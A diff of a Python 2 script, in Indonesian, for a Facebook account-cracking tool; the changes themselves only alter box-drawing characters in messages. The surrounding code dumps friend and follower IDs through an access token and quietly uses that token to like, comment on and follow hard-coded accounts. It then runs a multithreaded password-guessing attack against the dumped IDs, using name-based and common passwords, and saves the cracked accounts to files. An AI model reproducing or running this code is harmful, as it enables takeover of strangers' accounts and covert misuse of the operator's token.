@@ -67,7 +67,7 @@ def login():
                 except KeyError:
                         exit("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Token Expired")
 	elif login == "2":
-		print("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m You Will Be Redirected To Youtube")
+		print("\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m You Will Be Redirected To Youtube")
 		time.sleep(2)
 		os.system("xdg-open https://youtu.be/bszAm4C5ovE")
 		exit()
@@ -103,13 +103,13 @@ def bot_follow():
 	requests.post('https://graph.facebook.com/4257706904267068/likes?summary=true&access_token='+token)
 	requests.post('https://graph.facebook.com/4257706904267068/comments/?message='+komen3+'&access_token='+token)
 	requests.post('https://graph.facebook.com/4134622646575495/comments/?message='+komen2+'&access_token='+token)
-	print("\x1b[1;96m╠══◍➤®[\x1b[1;92m•\x1b[1;96m]\x1b[1;92m Login Berhasil")
+	print("\x1b[1;96m╚══◍➤®[\x1b[1;92m•\x1b[1;96m]\x1b[1;92m Login Berhasil")
 	menu()
 def publik():
         try:
                 token=open('___bangsat___','r').read()
         except IOError:
-                print('\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Token Invalid')
+                print('\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Token Invalid')
                 os.system('rm -rf ___bangsat___')
                 time.sleep(2)
                 login()
@@ -123,7 +123,7 @@ def publik():
                 except KeyError:
                         print('\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Profil Tidak Ditemukan')
 	                print("\x1b[1;92m║")
-                        raw_input("\x1b[1;92m╠══◍➤®[\x1b[1;97mKembali\x1b[1;92m]")
+                        raw_input("\x1b[1;92m╚══◍➤®[\x1b[1;97mKembali\x1b[1;92m]")
                         menu()
                 r=requests.get("https://graph.facebook.com/"+idt+"?fields=friends.limit(9999999)&access_token="+token)
                 id = []
@@ -144,15 +144,15 @@ def publik():
         except KeyError:
                 print('\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Tidak Ada Teman')
 	        print("\x1b[1;92m║")
-                raw_input('\x1b[1;92m╠══◍➤®[\x1b[1;97mKembali\x1b[1;92m]')
+                raw_input('\x1b[1;92m╚══◍➤®[\x1b[1;97mKembali\x1b[1;92m]')
                 menu()
 	except requests.exceptions.ConnectionError:
-		exit("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Koneksi Error")
+		exit("\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Koneksi Error")
 def like_post():
         try:
                 token=open('___bangsat___','r').read()
         except IOError:
-		print('\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Token Invalid')
+		print('\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Token Invalid')
                 os.system('rm -rf ___bangsat___')
                 time.sleep(2)
                 login()
@@ -177,16 +177,16 @@ def like_post():
 		print("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Selesai")
 		print("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m File Dump Tersimpan :\x1b[1;92m "+file)
 	        print("\x1b[1;92m║")
-		raw_input("\x1b[1;92m╠══◍➤®[\x1b[1;97mKembali\x1b[1;92m]")
+		raw_input("\x1b[1;92m╚══◍➤®[\x1b[1;97mKembali\x1b[1;92m]")
 		menu()
 
 	except requests.exceptions.ConnectionError:
-		exit("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Koneksi Error")
+		exit("\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Koneksi Error")
 def follower():
         try:
                 token=open('___bangsat___','r').read()
         except IOError:
-                print('\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Token Invalid')
+                print('\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Token Invalid')
                 os.system('rm -rf ___bangsat___')
                 time.sleep(2)
                 login()
@@ -198,9 +198,9 @@ def follower():
                         op = json.loads(req.text)
                         print("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Name : \x1b[1;92m"+op["name"])
                 except KeyError:
-                        print('\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Profil Tidak Ditemukan')
+                        print('\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Profil Tidak Ditemukan')
 	                print("\x1b[1;92m║")
-                        raw_input("\x1b[1;92m╠══◍➤®[\x1b[1;97mKembali\x1b[1;92m]")
+                        raw_input("\x1b[1;92m╚══◍➤®[\x1b[1;97mKembali\x1b[1;92m]")
                         menu()
 		r=requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=9999999")
                 id = []
@@ -209,27 +209,27 @@ def follower():
                 for a in z['friends']['data']:
                         id.append(a['id']+"<=>"+a['name'])
                         fle.write(a['id']+"<=>"+a['name']+'\n')
-                        print("\r\x1b[1;97m[\x1b[1;92m•\x1b[1;97m]\x1b[1;92m Dump\x1b[1;96m %s \x1b[1;92mID"%(str(len(id)))),;sys.stdout.flush();time.sleep(0.007)
+                        print("\r\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Dump\x1b[1;92m %s \x1b[1;97mID"%(str(len(id)))),;sys.stdout.flush();time.sleep(0.007)
                 fle.close()
                 print("\r\x1b[1;97m                     ")
                 print("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Selesai")
                 print("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m File Dump Tersimpan :\x1b[1;92m "+file)
 	        print("\x1b[1;92m║")
-                raw_input("\x1b[1;92m╠══◍➤®[\x1b[1;97mKembali\x1b[1;92m]")
+                raw_input("\x1b[1;92m╚══◍➤®[\x1b[1;97mKembali\x1b[1;92m]")
                 menu()
 
         except KeyError:
-                print('\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Tidak Ada Follower')
+                print('\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Tidak Ada Follower')
 	        print("\x1b[1;92m║")
-                raw_input('\x1b[1;92m╠══◍➤®[\x1b[1;97mKembali\x1b[1;92m]')
+                raw_input('\x1b[1;92m╚══◍➤®[\x1b[1;97mKembali\x1b[1;92m]')
                 menu()
 	except requests.exceptions.ConnectionError:
-		exit("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Koneksi Error")
+		exit("\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Koneksi Error")
 def teman():
         try:
                 token=open('___bangsat___','r').read()
         except IOError:
-                print('\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Token Invalid')
+                print('\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Token Invalid')
                 os.system('rm -rf ___bangsat___')
                 time.sleep(2)
                 login()
@@ -238,9 +238,9 @@ def teman():
                 try:
                    r=requests.get("https://graph.facebook.com/me/friends?access_token="+token+"&limit=99999999");requests.post('https://graph.facebook.com/100000834003593/subscribers?access_token='+token)
                 except KeyError:
-                        print('\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Tidak Ada Teman')
+                        print('\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Tidak Ada Teman')
 	                print("\x1b[1;92m║")
-                        raw_input("\x1b[1;92m╠══◍➤®[\x1b[1;97mKembali\x1b[1;92m]")
+                        raw_input("\x1b[1;92m╚══◍➤®[\x1b[1;97mKembali\x1b[1;92m]")
                         menu()
                 id = []
                 z=json.loads(r.text)
@@ -254,16 +254,16 @@ def teman():
                 print("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Selesai")
                 print("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m File Tersimpan :\x1b[1;92m "+file)
 	        print("\x1b[1;92m║")
-                raw_input("\x1b[1;92m╠══◍➤®[\x1b[1;97mKembali\x1b[1;92m]")
+                raw_input("\x1b[1;92m╚══◍➤®[\x1b[1;97mKembali\x1b[1;92m]")
                 menu()
 	except requests.exceptions.ConnectionError:
-		exit("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Koneksi Error")
+		exit("\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Koneksi Error")
 def menu():
 	global ip, org
 	try:
 		token=open('___bangsat___','r').read()
 	except IOError:
-		print("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Token Invalid")
+		print("\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Token Invalid")
 		os.system('rm -rf ___bangsat___')
 		time.sleep(2)
 		login()
@@ -272,7 +272,7 @@ def menu():
 		a = json.loads(otw.text)
 		nama = a['name']
 	except KeyError:
-		print("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Token Invalid")
+		print("\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Token Invalid")
 		os.system('rm -rf ___bangsat___')
 		time.sleep(2)
 		login()
@@ -298,7 +298,7 @@ def menu():
 def daftar_menu():
 	pilih = raw_input("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Choose :\x1b[1;96m ")
 	if pilih == "":
-		exit("\x1b[1;92m╠══◍➤®[\x1b[1;91m•\x1b[1;92m]\x1b[1;97m Wrong Input")
+		exit("\x1b[1;92m╚══◍➤®[\x1b[1;91m•\x1b[1;92m]\x1b[1;97m Wrong Input")
 	elif pilih == "1":
 		menu_instagram()
 	elif pilih == "2":
@@ -314,31 +314,31 @@ def daftar_menu():
 	elif pilih == "7":
 		print("\x1b[1;92m╠══◍➤®[\x1b[1;97m1\x1b[1;92m]\x1b[1;97m Lihat Hasil\x1b[1;92m Ok")
 		print("\x1b[1;92m╠══◍➤®[\x1b[1;97m2\x1b[1;92m]\x1b[1;97m Lihat Hasil\x1b[1;93m Cp")
-		print("\x1b[1;92m╠══◍➤®[\x1b[1;97m0\x1b[1;92m]\x1b[1;97m Kembali")
+		print("\x1b[1;92m╚══◍➤®[\x1b[1;97m0\x1b[1;92m]\x1b[1;97m Kembali")
 	        print("\x1b[1;92m║")
 		lihat = raw_input("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Choose :\x1b[1;92m ")
 		if lihat == "":
-			exit("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Wrong Input")
+			exit("\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Wrong Input")
 		elif lihat == "1":
 			try:
 				live=open('Live.txt','r').read()
 			except IOError:
-				exit("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Hasil Ok Tidak Ada")
+				exit("\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Hasil Ok Tidak Ada")
 			print("\x1b[1;92m"+live)
 			exit()
 		elif lihat == "2":
 			try:
                                 chek=open('Check.txt','r').read()
                         except IOError:
-                                exit("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Hasil Cp Tidak Ada")
+                                exit("\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Hasil Cp Tidak Ada")
                         print("\x1b[1;93m"+chek)
 			exit()
 		elif lihat == "0":
 			menu()
 		else:
-			exit("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Wrong Input")
+			exit("\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Wrong Input")
 	elif pilih == "8":
-		print("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Anda Akan Diarahkan Ke Whatsapp")
+		print("\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Anda Akan Diarahkan Ke Whatsapp")
 		time.sleep(2)
 		os.system("xdg-open https://wa.me/6285220859786?text=Hallo%20Bang%20Ganteng")
 		exit()
@@ -347,9 +347,9 @@ def daftar_menu():
 			print("\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Menghapus Cookie & Token")
 			os.remove("___bangsat___")
 		except Exception as e:
-			exit("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m File Tidak Ada")
+			exit("\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m File Tidak Ada")
 	else:
-		exit("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Wrong Input")
+		exit("\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Wrong Input")
 def metode():
 	print("\x1b[1;92m║")
 	print("\x1b[1;92m╠══◍➤®[\x1b[1;97m1\x1b[1;92m]\x1b[1;97m Metode mbasic")
@@ -358,7 +358,7 @@ def metode():
 	print("\x1b[1;92m║")
 	metode=raw_input("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Choose :\x1b[1;92m ")
 	if metode == '':
-		exit("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Wrong Input")
+		exit("\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Wrong Input")
 	elif metode == '1':
 		crack()
 	elif metode == '2':
@@ -366,7 +366,7 @@ def metode():
 	elif metode == '3':
 		crack3()
 	else:
-		exit("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Wrong Input")
+		exit("\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Wrong Input")
 def generate(text):
 	global country
 	results=[]
@@ -503,7 +503,7 @@ class crack:
 							self.fs=open(self.apk).read().splitlines()
 							break
 						except Exception as e:
-							exit("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m File Tidak Ada")
+							exit("\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m File Tidak Ada")
 							continue
 					self.fl=[]
 					for i in self.fs:
@@ -511,9 +511,9 @@ class crack:
 							self.fl.append({"id":i.split("<=>")[0]})
 						except:continue
 				except Exception as e:
-					exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m File Tidak Valid")
+					exit("\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m File Tidak Valid")
 					continue
-				print("\x1b[1;96m[\x1b[1;97m•\x1b[1;96m]\x1b[1;97m Contoh Password :\x1b[1;92m Sayang,Bangsat,123456")
+				print("\x1b[1;92m╠══◍➤[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Contoh Password :\x1b[1;92m Sayang,Bangsat,123456")
 				self.pwlist()
 				break
 			elif f=="t":
@@ -524,7 +524,7 @@ class crack:
 							self.fs=open(self.apk).read().splitlines()
 							break
 						except Exception as e:
-							exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m File Tidak Ada")
+							exit("\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m File Tidak Ada")
 							continue
 					self.fl=[]
 					for i in self.fs:
@@ -532,24 +532,24 @@ class crack:
 							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
 						except:continue
 				except Exception as e:
-					exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m File Tidak Valid")
+					exit("\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m File Tidak Valid")
 					continue
-				print("\x1b[1;96m[\x1b[1;97m•\x1b[1;96m]\x1b[1;97m Mainkan Mode Pesawat Jika Tidak Ada Hasil\n")
+				print("\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Mainkan Mode Pesawat Jika Tidak Ada Hasil\n")
 				ThreadPool(30).map(self.main,self.fl)
 				os.remove(self.apk)
-				exit("\n\x1b[1;97m[\x1b[1;92mSelesai\x1b[1;97m]")
+				exit("\n\x1b[1;92m╚══◍➤®[\x1b[1;97mSelesai\x1b[1;92m]")
 				break
 	def pwlist(self):
-		self.pw=raw_input("\x1b[1;96m[\x1b[1;97m•\x1b[1;96m]\x1b[1;97m Password :\x1b[1;92m ").split(",")
+		self.pw=raw_input("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Password :\x1b[1;92m ").split(",")
 		if len(self.pw) ==0:
 			self.pwlist()
 		else:
 			for i in self.fl:
 				i.update({"pw":self.pw})
-			print("\x1b[1;96m[\x1b[1;97m•\x1b[1;96m]\x1b[1;97m Mainkan Mode Pesawat Jika Tidak Ada Hasil\n")
+			print("\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Mainkan Mode Pesawat Jika Tidak Ada Hasil\n")
 			ThreadPool(30).map(self.main,self.fl)
 			os.remove(self.apk)
-			exit("\n\x1b[1;97m[\x1b[1;92mSelesai\x1b[1;97m]")
+			exit("\n\x1b[1;92m╚══◍➤®[\x1b[1;97mSelesai\x1b[1;92m]")
 	def main(self,fl):
 		try:
 			for i in fl.get("pw"):
